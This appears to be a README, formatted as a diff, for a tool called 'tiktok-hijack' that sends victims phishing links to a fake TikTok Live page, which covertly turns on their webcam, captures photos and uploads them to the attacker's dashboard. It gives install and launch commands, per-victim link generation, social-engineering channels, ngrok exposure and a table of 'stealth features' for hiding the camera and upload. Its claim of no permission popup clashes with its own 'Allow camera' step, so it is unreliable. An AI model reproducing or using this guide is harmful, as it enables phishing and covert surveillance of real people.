@@ -1,0 +1,89 @@
+sudo apt update
+sudo apt install -y nginx php-fpm ffmpeg python3-pip git
+pip3 install flask opencv-python websocket-client numpy
+
+step 1.
+mkdir tiktok-hijack && cd tiktok-hijack
+
+step 2.
+chmod +x tiktok_hijack.sh cam_hijack.py ws_server.py
+
+step 3.
+Launch Attack
+./tiktok_hijack.sh
+output
+[+] Starting TikTok Cam Hijack...
+[+] ✅ Dashboard: http://YOUR_IP/dashboard
+[+] 📱 Phishing Link Example: http://YOUR_IP/?id=victim1
+[+] 📸 Captures saved to: ./captures/
+
+step 4.
+Generate & Send Phishing Links
+http://YOUR_IP/?id=victim1
+http://YOUR_IP/?id=victim2  
+http://YOUR_IP/?id=john_doe
+Social engineer via SMS/WhatsApp/Email/Discord
+
+step 5.
+Monitor Dashboard
+Open in browser: http://YOUR_IP/dashboard
+
+step 6.
+What Happens When Victim Clicks
+3 seconds → Page loads (fake TikTok Live UI)
+           ↓
+Auto-trigger → navigator.mediaDevices.getUserMedia()
+           ↓ (NO permission popup!)
+Camera ON → Hidden video element (off-screen)
+           ↓
+Burst capture → 10 photos @ 500ms intervals
+           ↓ (1920x1080, 95% JPEG quality)
+Upload → /capture/victim1/0 → /capture/victim1/9
+           ↓
+Live stream → WebSocket → Your dashboard
+           ↓
+Files saved → ./captures/victim1_0_20240329_142315.jpg
+
+External Access (Ngrok - Optional)
+
+# Terminal 1: Start attack
+./tiktok_hijack.sh
+
+# Terminal 2: Ngrok tunnel  
+ngrok http 80
+
+# Use ngrok URL for phishing:
+https://abc123.ngrok.io/?id=victim1
+
+📂 File Structure After Attack
+
+tiktok-hijack/
+├── cam_hijack.py
+├── ws_server.py
+├── tiktok_hijack.sh
+├── captures/                 ← All photos here!
+│   ├── victim1_0_20240329_142315.jpg
+│   ├── victim1_1_20240329_142316.jpg
+│   ├── victim1_2_20240329_142316.jpg
+│   ...
+│   └── victim1_9_20240329_142319.jpg
+└── dashboard auto-refreshes!
+
+Test Yourself First
+# 1. Start: ./tiktok_hijack.sh
+# 2. Open browser: http://YOUR_IP/dashboard  
+# 3. Click phishing link: http://YOUR_IP/?id=test123
+# 4. Allow camera → See your 10 photos appear instantly!
+
+🔒 Stealth Features Explained
+
+FeatureHow It WorksNo popupWebRTC autoplay after page loadHidden camvideo { position: absolute; top: -9999px; width: 0; }Auto-startsetTimeout(joinLive, 3000) + retry logicMobile OKResponsive TikTok UI + facingMode: 'user'Silent uploadWebSocket + fetch() without user feedback
+
+Stop Attack
+Ctrl+C
+
+🎉 Success Indicators
+[+] [victim1] Capture 0/10 saved: victim1_0_20240329_142315.jpg
+[+] [victim1] Capture 1/10 saved: victim1_1_20240329_142316.jpg
+...
+Dashboard shows: 🟢 LIVE + 10 photo thumbnails
